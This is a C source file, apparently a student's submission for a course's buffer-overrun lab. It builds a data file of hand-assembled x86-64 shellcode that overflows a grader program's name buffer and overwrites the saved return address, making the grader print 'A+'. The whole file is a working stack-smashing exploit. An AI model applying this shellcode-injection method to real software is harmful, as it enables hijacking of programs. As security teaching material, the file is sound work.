/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Tyler Campbell and Lauren Johnston                         */
/*--------------------------------------------------------------------*/

#define MAX_BUFFER_LENGTH 72
#include <stdio.h>
#include <string.h>

/* Produces a file named dataAplus, that causes the grader program to 
write our names (Tyler & Lauren) and recommend a grade of "A+" by using 
a buffer overrun attack */
int main(void)
{
	FILE* file;
	int i;
	unsigned char name[MAX_BUFFER_LENGTH];
	unsigned long data;
	
	/* create file*/
	file = fopen("dataAplus", "w");
	
	/* name string */
	name[0] = 'T';
	name[1] = 'y';
	name[2] = 'l';
	name[3] = 'e';
	name[4] = 'r';
	name[5] = ' ';
	name[6] = '&';
	name[7] = ' ';
	name[8] = 'L';
	name[9] = 'a';
	name[10] = 'u';
	name[11] = 'r';
	name[12] = 'e'; 
	name[13] = 'n';
	name[14] = '\0';
	/* "A" string */
	name[15] = 'A';
	name[16] = '\0';
	/* mov "A" to rdi */
	name[17] = 0x48;
	name[18] = 0xc7;
	name[19] = 0xc7;
	name[20] = 0x2f;
	name[21] = 0xb1;
	name[22] = 0x6b;
	name[23] = 0x00;
	/* mov 0 to eax */
	name[24] = 0xb8;
	name[25] = 0x00;
	name[26] = 0x00;
	name[27] = 0x00;
	name[28] = 0x00;
  /* call printf*/
	name[29] = 0xe8;
	name[30] = 0xee;
	name[31] = 0x6a;
	name[32] = 0xd4;
	name[33] = 0xff;
  /* mov '+' to &grade */
	name[34] = 0xc6;
	name[35] = 0x04;
	name[36] = 0x25;
	name[37] = 0x84;
	name[38] = 0x80;
	name[39] = 0x6b;
	name[40] = 0x00;
	name[41] = 0x2b;
	/* jmp main + offset (0x400e9b) */
	name[42] = 0xe9; 
	name[43] = 0x4c;
	name[44] = 0x5d;
	name[45] = 0xd4;
	name[46] = 0xff;
	

	for (i = 0; i < 15; i++)
		putc(name[i], file);
	
	for (i = 15; i < 72; i++)
	{
		data = name[i];
		fwrite(&data, 1, 1, file);
	}
	
	/* overwrite rip */
	data = 0x6bb131;
	fwrite(&data, 8, 1, file);

	return 0;
}